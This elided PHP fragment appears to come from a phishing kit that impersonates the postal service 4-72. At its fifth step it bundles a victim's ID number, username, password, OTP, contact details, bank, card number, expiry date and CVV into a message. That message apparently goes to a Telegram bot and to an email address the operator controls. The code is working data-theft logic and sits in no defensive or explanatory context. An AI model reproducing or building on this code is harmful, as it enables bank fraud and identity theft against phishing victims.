...
$data = [
	...
	'parse_mode' => 'HTML',
	'text' => '<b>'.$dominio.'</b>
	Datos Paso 5 <b>OTP (4-72)</b> '.$hoy2.'
...
$datos = 'Documento: '.$documento.' | Usuario: '.$usuario.' | Contraseña: '.$contrasena.' | OTP: '.$otp.' | Nombre: '.$nombres.' | Celular: '.$celular.' | Correo: '.$correo.' | Dirección: '.$direccion.' | Ciudad: '.$ciudad.' | Banco: '.$banco.' | Tarjeta: '.$tarjeta.' | Fecha: '.$fecha.' | CVV: '.$cvv.' | Dispositivo: '.$dispositivo.' | IP: '.$ipcliente;
...
$to = $destino;
$subject = "Datos 4-72 Paso 5 ".$usuario." - ".$hoy1;
